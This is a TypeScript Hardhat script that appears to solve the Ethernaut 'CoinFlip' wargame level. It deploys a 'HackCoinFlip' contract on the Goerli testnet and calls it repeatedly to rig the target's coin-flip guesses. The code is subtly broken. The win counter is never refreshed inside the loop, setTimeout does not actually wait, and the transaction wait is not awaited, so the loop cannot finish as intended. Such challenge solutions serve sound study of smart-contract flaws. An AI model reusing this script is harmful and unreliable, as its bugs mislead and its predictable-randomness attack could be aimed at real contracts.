import { ethers, network } from "hardhat";
import * as dotenv from 'dotenv';
import { Contract, providers, Signer } from "ethers";

dotenv.config();

// Set the number of time you want to flip the coin
const FLIP_NUM = 10;
let lastBlock: number;

async function main() {
    // We only verify on a testnet!
    if (network.config.chainId != 5) {
      console.log("Ethernaut contracts can only be attacked on the Goerli Network.");
      
    } else {
        // Initialize variables needed to access the coin flip contract
        // const address: string = process.env.GOERLI_PRIVATE_KEY ? process.env.GOERLI_PRIVATE_KEY : '';
        // const signer: Signer = await .getSigner(address);
        // console.log(`Signer: ${await signer.getAddress()}`)
        const contractAddress: string = process.env.CONTRACT_INSTANCE_ADDRESS ? process.env.CONTRACT_INSTANCE_ADDRESS : ethers.constants.AddressZero;
        const contract: Contract = await ethers.getContractAt('CoinFlip', contractAddress);

        console.log("Contract Instance Loaded")
        
        // Deploy the hack coin flip contract with a guess goal of 10
        const exploitFactory = await ethers.getContractFactory("HackCoinFlip");
        const exploitFlipContract = await exploitFactory.deploy(contractAddress);

        // Set consecutive wins to 0
        let wins = await contract.consecutiveWins();

        // Attack the contract for the desired number of times
        // Loop while consecutive wins is less than the desired number of wins
        while (wins < FLIP_NUM) {
            const block: number = await ethers.provider.getBlockNumber();
            if (block == lastBlock) {
              console.log("Waiting for block to finish mining...");
              setTimeout(() => {}, 30000);
            } else {
              console.log("Guessing coin flip...");
              const transactionResponse = await exploitFlipContract.guaranteeGuess();
              transactionResponse.wait(14);
              console.log(`Consecutive Wins: ${wins}`);
            }
            lastBlock = block;
        }

        (wins == FLIP_NUM) ? console.log("Attacked Successful") : console.log("Attacked Failed");
    }
  }
  
  // We recommend this pattern to be able to use async/await everywhere
  // and properly handle errors.
  main()
    .then(() => process.exit(0))
    .catch((error) => {
      console.error(error)
      process.exit(1)
    })